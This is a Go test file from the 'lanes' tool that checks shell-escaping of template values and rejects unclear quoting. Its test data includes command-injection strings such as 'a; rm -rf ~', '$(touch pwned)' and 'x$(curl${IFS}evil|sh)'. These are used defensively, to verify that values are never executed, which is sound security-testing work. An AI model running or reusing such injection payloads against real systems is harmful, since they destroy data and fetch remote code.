package ui

import (
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/chriha/lanes/internal/config"
)

func TestRenderEscapesValues(t *testing.T) {
	tests := []struct {
		name, tmpl string
		v          any
		want       string
	}{
		{"command substitution outside", `x {{.v}}`, "a$(touch p)", `x 'a$(touch p)'`},
		{"backticks outside", `x {{.v}}`, "a`id`", "x 'a`id`'"},
		{"semicolon outside", `x {{.v}}`, "a; rm -rf ~", `x 'a; rm -rf ~'`},
		{"single quote outside", `x {{.v}}`, "it's", `x 'it'\''s'`},
		{"double quote outside", `x {{.v}}`, `say "hi"`, `x 'say "hi"'`},
		{"newline outside", `x {{.v}}`, "a\nb", "x 'a\nb'"},
		{"number outside", `gh pr view {{.v}}`, 42, `gh pr view '42'`},
		{"command substitution in double quotes", `x "/r {{.v}}"`, "a$(touch p)", `x "/r a\$(touch p)"`},
		{"backticks in double quotes", `x "{{.v}}"`, "a`id`", "x \"a\\`id\\`\""},
		{"semicolon in double quotes", `x "{{.v}}"`, "a; b", `x "a; b"`},
		{"single quote in double quotes", `x "{{.v}}"`, "it's", `x "it's"`},
		{"double quote in double quotes", `x "{{.v}}"`, `say "hi"`, `x "say \"hi\""`},
		{"backslash in double quotes", `x "{{.v}}"`, `a\`, `x "a\\"`},
		{"newline in double quotes", `x "{{.v}}"`, "a\nb", "x \"a\nb\""},
		{"number in double quotes", `x "/w {{.v}}"`, 7, `x "/w 7"`},
		{"after a closed single-quoted word", `x 'a' {{.v}}`, "b c", `x 'a' 'b c'`},
		{"escaped quote stays inside", `x "a\" {{.v}}"`, "$b", `x "a\" \$b"`},
		{"escaped quote outside", `x \" {{.v}}`, "$b", `x \" '$b'`},
		{"inside $(…) in double quotes", `x "$(echo {{.v}})"`, "a b", `x "$(echo 'a b')"`},
		{"after $(…) in double quotes", `x "$(pwd)/{{.v}}"`, "$b", `x "$(pwd)/\$b"`},
		{"nested parens in $(…)", `x "$(f (a) {{.v}})"`, "b", `x "$(f (a) 'b')"`},
		{"after ${…}", `x "${HOME:-/}{{.v}}"`, "$b", `x "${HOME:-/}\$b"`},
		{"after a comment line", "# don't \"\nx {{.v}}", "b", "# don't \"\nx 'b'"},
		{"here-string", `grep a <<< {{.v}}`, "a b", `grep a <<< 'a b'`},
		{"raw outside", `x {{.v | raw}}`, "-a -b", `x -a -b`},
		{"raw in double quotes", `x "{{.v | raw}}"`, "$b", `x "$b"`},
		{"raw as a function", `x {{raw .v}}`, "-a -b", `x -a -b`},
		{"q outside", `x {{.v | q}}`, "it's", `x 'it'\''s'`},
		{"q in double quotes", `x "{{.v | q}}"`, "$b", `x "\$b"`},
		{"q as a function", `x {{q .v}}`, "a b", `x 'a b'`},
		{"printf result", `x {{printf "%s-%d" .v 1}}`, "a b", `x 'a b-1'`},
		{"if with the same context", `x {{if .v}}"{{.v}}"{{else}}none{{end}} {{.v}}`, "$b", `x "\$b" '$b'`},
		{"range over a slice", `x{{range .v}} {{.}}{{end}}`, []string{"a b", "c"}, `x 'a b' 'c'`},
		{"variable declaration prints nothing", `{{$t := .v}}x {{$t}}`, "a b", `x 'a b'`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := render(tt.tmpl, map[string]any{"v": tt.v})
			if err != nil {
				t.Fatal(err)
			}
			if got != tt.want {
				t.Errorf("render(%q) = %q, want %q", tt.tmpl, got, tt.want)
			}
		})
	}
}

// The shell must see each value as exactly that value, and run none of it.
func TestRenderedValuesReachTheShellVerbatim(t *testing.T) {
	values := []string{
		"plain", "a b", "$(touch pwned)", "`touch pwned`", "a; touch pwned", "a && touch pwned", "it's",
		`say "hi"`, `back\slash`, "a\nb", "$HOME", "x$(curl${IFS}evil|sh)", `"; touch pwned; "`, "'; touch pwned; '",
	}
	tmpls := []string{
		`printf %s {{.v}}`,
		`printf %s "{{.v}}"`,
		`printf %s "pre {{.v}} post"`,
		`printf %s "$(printf %s {{.v}})"`,
	}
	for _, tmpl := range tmpls {
		for _, v := range values {
			t.Run(tmpl+"/"+v, func(t *testing.T) {
				cmd, err := render(tmpl, map[string]any{"v": v})
				if err != nil {
					t.Fatal(err)
				}
				dir := t.TempDir()
				c := exec.Command("/bin/sh", "-c", cmd)
				c.Dir = dir
				out, err := c.Output()
				if err != nil {
					t.Fatalf("%q: %v", cmd, err)
				}
				want := v
				if strings.Contains(tmpl, "pre ") {
					want = "pre " + v + " post"
				}
				if string(out) != want {
					t.Errorf("%q printed %q, want %q", cmd, out, want)
				}
				if _, err := os.Stat(filepath.Join(dir, "pwned")); err == nil {
					t.Errorf("%q ran part of the value", cmd)
				}
			})
		}
	}
}

func TestParseTemplateRejectsUnclearQuoting(t *testing.T) {
	tests := []struct{ name, tmpl, want string }{
		{"single quotes", `x '{{.v}}'`, "inside single quotes"},
		{"single quotes in double quotes in $(…)", `x "$(echo '{{.v}}')"`, "inside single quotes"},
		{"ansi-c quotes", `x $'a {{.v}}'`, "inside single quotes"},
		{"backticks", "x `echo {{.v}}`", "inside `…`"},
		{"backticks in double quotes", "x \"`echo {{.v}}`\"", "inside `…`"},
		{"quotes inside backticks", "x `echo \"a\"` {{.v}}", "lanes cannot tell"},
		{"parameter expansion", `x ${HOME:-{{.v}}}`, "inside ${…}"},
		{"quotes in parameter expansion", `x "${a:-"b"}" {{.v}}`, "lanes cannot tell"},
		{"after a backslash", `x \{{.v}}`, "after a backslash"},
		{"after a backslash in double quotes", `x "\{{.v}}"`, "after a backslash"},
		{"after $", `x ${{.v}}`, "after $"},
		{"after $ in double quotes", `x "${{.v}}"`, "after $"},
		{"comment", `x # {{.v}}`, "# comment"},
		{"here-document", "cat <<EOF\n{{.v}}\nEOF", "here-document"},
		{"paren in one branch inside $(…)", `x "$(echo {{if .x}}({{end}}) {{.v}}"`, "{{if}}"},
		{"case inside $(…)", `x "$(case a in a) echo;; esac)" {{.v}}`, "case inside"},
		{"if ends in another context", `x {{if .v}}"{{end}}{{.v}}"`, "{{if}}"},
		{"else ends in another context", `x {{if .v}}a{{else}}'{{end}}`, "{{if}}"},
		{"range ends in another context", `x {{range .v}}"{{end}}`, "{{range}}"},
		{"with ends in another context", `x {{with .v}}"{{end}}`, "{{with}}"},
		{"maybe a comment after if", `x {{if .v}} {{else}}a{{end}}# {{.v}}`, "lanes cannot tell"},
		{"template call", `{{define "t"}}{{.}}{{end}}x {{template "t" .v}}`, "not supported"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := ParseTemplate(tt.tmpl)
			if err == nil || !strings.Contains(err.Error(), tt.want) {
				t.Errorf("ParseTemplate(%q) error = %v, want one containing %q", tt.tmpl, err, tt.want)
			}
		})
	}
}

func TestPlaceholderInSingleQuotesNamesTheAction(t *testing.T) {
	m := whenModel(t)
	m.runAction("rev", config.Action{Type: "run", Run: "echo '{{.id}}'"})
	if !strings.HasPrefix(m.notice, "action rev: ") || !strings.Contains(m.notice, "single quotes") {
		t.Errorf("notice = %q, want the action and the single-quote error", m.notice)
	}
}

func TestCwdIsNotShellQuoted(t *testing.T) {
	m := whenModel(t)
	m.cursor = 0
	dir := filepath.Join(t.TempDir(), "a b")
	if err := os.Mkdir(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	m.items()[0].Fields["dir"] = dir
	cmd := m.runAction("here", config.Action{Type: "run", Run: "true", Cwd: "{{.dir}}"})
	if cmd == nil {
		t.Fatalf("no command; notice %q", m.notice)
	}
	if d := cmd().(doneMsg); !d.ok {
		t.Errorf("run in %q failed: %s", dir, d.notice)
	}
}

// The examples lanes ships (default config, lanes init template, README) still render to valid shell.
func TestShippedRunExamplesRender(t *testing.T) {
	readme, err := os.ReadFile("../../README.md")
	if err != nil {
		t.Fatal(err)
	}
	sources := map[string]string{
		"default": config.Default,
		"init":    config.ProjectTemplate("github", "o/r"),
		"README":  string(readme),
	}
	data := map[string]any{
		"id": "!1", "iid": 1, "number": 2, "key": "ENG-3", "title": "it's $(bad)", "url": "https://x/y/1",
		"author": "a", "me": "me", "branch": "b", "settings": "/tmp/s.json", "session": "s", "action": "a",
		"vars": map[string]any{"reviewers": "alice,bob", "dir": "."},
	}
	runLine := regexp.MustCompile(`\brun\s*=\s*'([^']*\{\{[^']*)'`)
	n := 0
	for src, text := range sources {
		for _, m := range runLine.FindAllStringSubmatch(text, -1) {
			n++
			got, err := render(m[1], data)
			if err != nil {
				t.Errorf("%s: %q: %v", src, m[1], err)
				continue
			}
			if out, err := exec.Command("/bin/sh", "-n", "-c", got).CombinedOutput(); err != nil {
				t.Errorf("%s: %q renders to invalid shell %q: %s", src, m[1], got, out)
			}
		}
	}
	if n < 5 {
		t.Errorf("found %d run examples, want the shipped ones", n)
	}
}
